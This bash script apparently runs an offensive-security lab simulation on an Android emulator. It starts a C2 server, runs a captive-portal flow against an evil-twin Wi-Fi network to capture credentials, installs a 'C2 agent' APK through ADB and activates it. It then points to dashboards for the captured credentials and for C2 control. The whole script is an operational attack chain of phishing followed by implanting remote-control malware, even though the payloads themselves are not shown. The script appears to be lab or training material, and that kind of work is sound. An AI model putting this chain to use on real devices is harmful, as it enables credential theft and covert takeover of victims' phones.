#!/bin/bash
# ============================================================
# OffSec Lab — Full Attack Simulation Runner
# Jalanin 3 step: Dashboard → Maestro Portal → APK Install → Agent
# ============================================================
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MAESTRO="$HOME/.maestro/bin/maestro"
APK="$SCRIPT_DIR/c2-lab-agent.apk"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  OffSec Lab — Full Attack Simulation${NC}"
echo -e "${GREEN}========================================${NC}"

# ---- Step 0: Ensure prerequisites ----
echo -e "\n${YELLOW}[CHECK] Prerequisites...${NC}"

if ! adb devices | grep -q emulator; then
    echo -e "${RED}[FAIL] No emulator connected. Run: adb devices${NC}"
    exit 1
fi
echo -e "${GREEN}[OK] Emulator connected${NC}"

if [ ! -f "$APK" ]; then
    echo -e "${RED}[FAIL] APK not found: $APK${NC}"
    exit 1
fi
echo -e "${GREEN}[OK] APK found: $APK${NC}"

# ---- Step 1: Start Dashboard (in background) ----
echo -e "\n${YELLOW}[STEP 1/4] Starting Dashboard...${NC}"
pkill -f "c2_server.py" 2>/dev/null || true
sleep 1
python3 "$SCRIPT_DIR/c2_server.py" &
DASH_PID=$!
sleep 2

if kill -0 $DASH_PID 2>/dev/null; then
    echo -e "${GREEN}[OK] Dashboard running (PID: $DASH_PID)${NC}"
    echo -e "${GREEN}      → http://10.0.2.2:4443/${NC}"
else
    echo -e "${RED}[FAIL] Dashboard failed to start${NC}"
    exit 1
fi

# ---- Step 2: Maestro Portal Flow ----
echo -e "\n${YELLOW}[STEP 2/4] Running Maestro Captive Portal Flow...${NC}"
echo -e "${YELLOW}      (Make sure WEF Evil Twin is running!)${NC}"
echo -e "${YELLOW}      Press Enter to continue or Ctrl+C to cancel${NC}"
read -r

if [ -f "$SCRIPT_DIR/full-attack-flow.yaml" ]; then
    $MAESTRO test "$SCRIPT_DIR/full-attack-flow.yaml" 2>&1 || {
        echo -e "${YELLOW}[WARN] Maestro flow had errors (may be OK)${NC}"
    }
    echo -e "${GREEN}[OK] Portal flow completed${NC}"
else
    echo -e "${RED}[FAIL] YAML not found${NC}"
fi

echo -e "\n${YELLOW}Check dashboard for captured credentials:${NC}"
echo -e "${YELLOW}  → http://10.0.2.2:4443/${NC}"
echo -e "${YELLOW}Press Enter after credentials appear...${NC}"
read -r

# ---- Step 3: Install APK via ADB ----
echo -e "\n${YELLOW}[STEP 3/4] Installing C2 Agent APK...${NC}"
adb install -r "$APK" 2>&1 | tail -1
echo -e "${GREEN}[OK] APK installed${NC}"

# ---- Step 4: Maestro Agent Activation ----
echo -e "\n${YELLOW}[STEP 4/4] Activating C2 Agent...${NC}"
sleep 2
if [ -f "$SCRIPT_DIR/agent-activate.yaml" ]; then
    $MAESTRO test "$SCRIPT_DIR/agent-activate.yaml" 2>&1 || {
        echo -e "${YELLOW}[WARN] Agent activation may have issues - check manually${NC}"
    }
else
    # Manual activation
    echo -e "${YELLOW}Starting agent manually via ADB...${NC}"
    adb shell am start -n com.c2.agent/.MainActivity 2>/dev/null || true
    sleep 3
    adb shell input tap 540 800 2>/dev/null || true  # tap START AGENT button
fi
echo -e "${GREEN}[OK] Agent activation attempted${NC}"

# ---- Done ----
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}  SIMULATION COMPLETE!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "  Dashboard:   http://10.0.2.2:4443/"
echo -e "  Credentials: http://10.0.2.2:4443/creds"
echo -e "  C2 Control:  http://10.0.2.2:4443/admin"
echo -e ""
echo -e "${YELLOW}  Dashboard PID: $DASH_PID${NC}"
echo -e "${YELLOW}  Kill with: kill $DASH_PID${NC}"
echo -e "${GREEN}========================================${NC}"
